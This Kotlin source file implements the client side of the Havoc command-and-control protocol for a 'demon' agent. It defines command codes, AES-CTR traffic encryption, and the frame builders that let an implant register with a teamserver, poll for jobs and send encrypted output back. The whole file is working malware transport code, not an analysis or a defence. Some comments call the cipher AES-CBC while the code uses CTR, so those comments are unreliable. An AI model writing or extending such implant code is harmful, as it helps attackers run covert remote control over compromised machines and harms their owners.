package com.demon.agent.transport

import org.bouncycastle.crypto.digests.SHA3Digest
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.security.SecureRandom

/*
 * HavocProtocol.kt — Binary C2 protocol matching the Havoc teamserver exactly.
 *
 * All constants mirror teamserver/pkg/agent/commands.go.
 *
 * ── Registration frame ─────────────────────────────────────────────────
 * [4] SIZE         (total frame bytes after this field)
 * [4] MAGIC        0xDEADBEEF
 * [4] AGENT_ID
 * [4] DEMON_INIT   = 99  ← registration command
 * [4] REQUEST_ID   = 0
 * [32] AES_KEY
 * [16] AES_IV
 * [N] AES-CBC encrypted registration body
 *
 * ── Beacon frame (get jobs) ────────────────────────────────────────────
 * [4] SIZE
 * [4] MAGIC
 * [4] AGENT_ID
 * [4] COMMAND_GET_JOB = 1
 * [4] REQUEST_ID  = 0
 *
 * ── Response output frame ──────────────────────────────────────────────
 * [4] SIZE
 * [4] MAGIC
 * [4] AGENT_ID
 * [4] COMMAND      (e.g. BEACON_OUTPUT = 94)
 * [4] REQUEST_ID
 * [4] DATA_SIZE
 * [N] AES-encrypted data
 */

// ── Command constants (must match teamserver/pkg/agent/commands.go) ───
object CommandId {
    const val COMMAND_GET_JOB   = 1    // beacon: request pending jobs
    const val DEMON_INIT        = 99   // registration command
    const val COMMAND_CHECKIN   = 100  // unused in protocol; use GET_JOB for beaconing
    const val COMMAND_NOJOB     = 10   // server reply: no jobs queued
    const val SLEEP             = 11
    const val PROC_LIST         = 12
    const val FS                = 15
    const val TOKEN             = 40
    const val EXIT              = 92
    const val BEACON_OUTPUT     = 94   // agent output packet
    const val CONSOLE_MESSAGE   = 0x80 // 128
}

const val DEMON_MAGIC: UInt = 0xDEADBEEFu

// ── AES-256 CTR — matches teamserver's XCryptBytesAES256 exactly ──────
//
// The teamserver (Go) uses crypto/cipher.NewCTR which is standard AES-CTR
// (NIST SP 800-38A, counter mode). BouncyCastle's SICBlockCipher is the
// same algorithm (SIC = Segmented Integer Counter = CTR).
//
// CTR is symmetric: encrypt == decrypt (XOR with keystream).
// No padding is needed — output length == input length.

object AesCtr {

    private fun process(data: ByteArray, key: ByteArray, iv: ByteArray): ByteArray {
        // BufferedBlockCipher wrapping SICBlockCipher gives us a streaming CTR cipher
        val ctr = org.bouncycastle.crypto.BufferedBlockCipher(
            org.bouncycastle.crypto.modes.SICBlockCipher(
                org.bouncycastle.crypto.engines.AESEngine()))
        ctr.init(true, org.bouncycastle.crypto.params.ParametersWithIV(
            org.bouncycastle.crypto.params.KeyParameter(key), iv))
        val out = ByteArray(ctr.getOutputSize(data.size))
        val n   = ctr.processBytes(data, 0, data.size, out, 0)
        ctr.doFinal(out, n)
        return out
    }

    fun encrypt(data: ByteArray, key: ByteArray, iv: ByteArray): ByteArray = process(data, key, iv)
    fun decrypt(data: ByteArray, key: ByteArray, iv: ByteArray): ByteArray = process(data, key, iv)
}

// ── Big-endian packet writer ──────────────────────────────────────────
// The Havoc teamserver parser defaults to big-endian (parser.bigEndian = true).
// All data sent FROM the agent TO the server must be big-endian.

class PacketBuilder {
    private val buf = mutableListOf<Byte>()

    fun addInt32(v: Int): PacketBuilder {
        ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(v).array()
            .forEach { buf.add(it) }
        return this
    }

    fun addInt64(v: Long): PacketBuilder {
        ByteBuffer.allocate(8).order(ByteOrder.BIG_ENDIAN).putLong(v).array()
            .forEach { buf.add(it) }
        return this
    }

    /** [4 bytes length BE][bytes] */
    fun addBytes(data: ByteArray): PacketBuilder {
        addInt32(data.size)
        data.forEach { buf.add(it) }
        return this
    }

    /** [4 bytes length BE][UTF-8 string + NUL] */
    fun addString(s: String): PacketBuilder {
        val bytes = (s + "\u0000").toByteArray(Charsets.UTF_8)
        addInt32(bytes.size)
        bytes.forEach { buf.add(it) }
        return this
    }

    fun build(): ByteArray = buf.toByteArray()
}

// ── Packet reader ─────────────────────────────────────────────────────
// Server responses (BuildPayloadMessage) are little-endian.
// So PacketParser (used to read server responses) uses little-endian.

class PacketParser(private var data: ByteArray) {
    private var pos = 0
    val remaining: Int get() = data.size - pos

    fun readInt32(): Int {
        if (remaining < 4) return 0
        val v = ByteBuffer.wrap(data, pos, 4).order(ByteOrder.LITTLE_ENDIAN).int
        pos += 4; return v
    }

    fun readInt64(): Long {
        if (remaining < 8) return 0L
        val v = ByteBuffer.wrap(data, pos, 8).order(ByteOrder.LITTLE_ENDIAN).long
        pos += 8; return v
    }

    /** Read [4-byte-length][bytes] */
    fun readBytes(): ByteArray {
        val size = readInt32()
        if (size <= 0 || remaining < size) return ByteArray(0)
        val v = data.copyOfRange(pos, pos + size)
        pos += size; return v
    }

    fun readString(): String = readBytes().toString(Charsets.UTF_8).trimEnd('\u0000')

    /** Read exactly `size` bytes, no length prefix */
    fun readRaw(size: Int): ByteArray {
        if (size <= 0 || remaining < size) return ByteArray(0)
        val v = data.copyOfRange(pos, pos + size)
        pos += size; return v
    }

    /** AES-CBC decrypt everything from current pos to end, replace buffer */
    fun decrypt(key: ByteArray, iv: ByteArray) {
        if (remaining == 0) return
        data = AesCtr.decrypt(data.copyOfRange(pos, data.size), key, iv)
        pos  = 0
    }
}

// ── Frame builder ─────────────────────────────────────────────────────

object FrameBuilder {

    /**
     * Build the registration frame.
     *
     * Wire layout:
     *   [4] SIZE (= everything after this field)
     *   [4] MAGIC (0xDEADBEEF)
     *   [4] AGENT_ID
     *   [4] DEMON_INIT (99)
     *   [4] REQUEST_ID = 0
     *   [32] AES KEY
     *   [16] AES IV
     *   [N] AES-encrypted registration body
     */
    fun buildRegistration(agentId: Int, body: ByteArray,
                          aesKey: ByteArray, aesIv: ByteArray): ByteArray {
        val encrypted = AesCtr.encrypt(body, aesKey, aesIv)

        // The teamserver parser defaults to BIG-ENDIAN for the outer header fields:
        //   SIZE, MAGIC, AGENTID → big-endian
        // The inner fields (COMMAND, REQUEST_ID) are also read big-endian by ParseInt32.
        // AES key/IV are raw bytes (no endianness).
        // The encrypted body content uses little-endian (parsed after SetBigEndian(false)).

        val frameBody = ByteBuffer
            .allocate(4 + 4 + 4 + 4 + 32 + 16 + encrypted.size)
            .order(ByteOrder.BIG_ENDIAN)   // server parser is big-endian by default
            .putInt(DEMON_MAGIC.toInt())   // MAGIC
            .putInt(agentId)               // AGENT_ID
            .putInt(CommandId.DEMON_INIT)  // COMMAND = 99
            .putInt(0)                     // REQUEST_ID
            .put(aesKey)                   // 32 bytes (raw)
            .put(aesIv)                    // 16 bytes (raw)
            .put(encrypted)
            .array()

        // SIZE field — also big-endian
        val sizeBE = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
            .putInt(frameBody.size).array()
        return sizeBE + frameBody
    }

    /**
     * Build a beacon frame (request pending jobs from teamserver).
     *
     * Wire layout:
     *   [4] SIZE
     *   [4] MAGIC
     *   [4] AGENT_ID
     *   [4] COMMAND_GET_JOB (1)
     *   [4] REQUEST_ID = 0
     */
    fun buildBeacon(agentId: Int): ByteArray {
        val body = ByteBuffer.allocate(4 + 4 + 4 + 4)
            .order(ByteOrder.BIG_ENDIAN)   // server parser is big-endian
            .putInt(DEMON_MAGIC.toInt())
            .putInt(agentId)
            .putInt(CommandId.COMMAND_GET_JOB)
            .putInt(0)
            .array()

        val sizeBE = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
            .putInt(body.size).array()
        return sizeBE + body
    }

    /**
     * Build an output/response frame (agent → teamserver).
     *
     * The server's handleDemonAgent loop reads Header.Data as:
     *   [4 BE] COMMAND_ID    ← read BEFORE decryption (ParseInt32, bigEndian=true)
     *   [4 BE] REQUEST_ID    ← read BEFORE decryption
     *   then DecryptBuffer(key, iv) on the rest
     *   [4 BE] DATA_LEN + [N] DATA  ← read via ParseBytes() after decrypt
     *
     * Full wire layout:
     *   [4 BE] SIZE
     *   [4 BE] MAGIC
     *   [4 BE] AGENT_ID
     *   [4 BE] COMMAND_ID    ← plaintext
     *   [4 BE] REQUEST_ID    ← plaintext
     *   [4 BE] DATA_LEN      ← plaintext length prefix for ParseBytes()
     *   [N]    AES-CTR(data) ← encrypted payload bytes
     */
    fun buildOutput(agentId: Int, commandId: Int, requestId: Int,
                    payload: ByteArray, aesKey: ByteArray, aesIv: ByteArray): ByteArray {

        val encrypted = if (payload.isNotEmpty()) AesCtr.encrypt(payload, aesKey, aesIv)
                        else ByteArray(0)

        // Body after SIZE field:
        // MAGIC(4) + AGENTID(4) + CMDID(4) + REQID(4) + DATALEN(4) + encrypted(N)
        val body = ByteBuffer
            .allocate(4 + 4 + 4 + 4 + 4 + encrypted.size)
            .order(ByteOrder.BIG_ENDIAN)
            .putInt(DEMON_MAGIC.toInt())    // MAGIC
            .putInt(agentId)                // AGENT_ID
            .putInt(commandId)              // COMMAND_ID  (plaintext, before decrypt)
            .putInt(requestId)              // REQUEST_ID  (plaintext, before decrypt)
            .putInt(encrypted.size)         // DATA_LEN    (ParseBytes length prefix)
            .put(encrypted)                 // encrypted data
            .array()

        val sizeBE = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
            .putInt(body.size).array()
        return sizeBE + body
    }

    /**
     * Parse the server's response frame header.
     * Returns the raw payload bytes after SIZE+MAGIC+AGENTID, or null on error.
     */
    fun parseResponsePayload(raw: ByteArray): ByteArray? {
        if (raw.size < 12) return null
        val buf      = ByteBuffer.wrap(raw).order(ByteOrder.BIG_ENDIAN) // server sends BE
        val bodySize = buf.int   // SIZE field
        /*val magic  =*/ buf.int // MAGIC
        /*val agent  =*/ buf.int // AGENT_ID
        // Remaining bytes are the (encrypted) payload
        val payloadStart = 12
        val payloadEnd   = (4 + bodySize).coerceAtMost(raw.size)
        if (payloadEnd <= payloadStart) return ByteArray(0)
        return raw.copyOfRange(payloadStart, payloadEnd)
    }
}

// ── Utilities ─────────────────────────────────────────────────────────

fun sha3_256(input: String): String {
    val bytes  = input.toByteArray(Charsets.UTF_8)
    val digest = SHA3Digest(256)
    digest.update(bytes, 0, bytes.size)
    val out = ByteArray(32)
    digest.doFinal(out, 0)
    return out.joinToString("") { "%02x".format(it) }
}

fun generateAgentId(): Int = SecureRandom().nextInt(Int.MAX_VALUE)

fun randomBytes(n: Int): ByteArray = ByteArray(n).also { SecureRandom().nextBytes(it) }
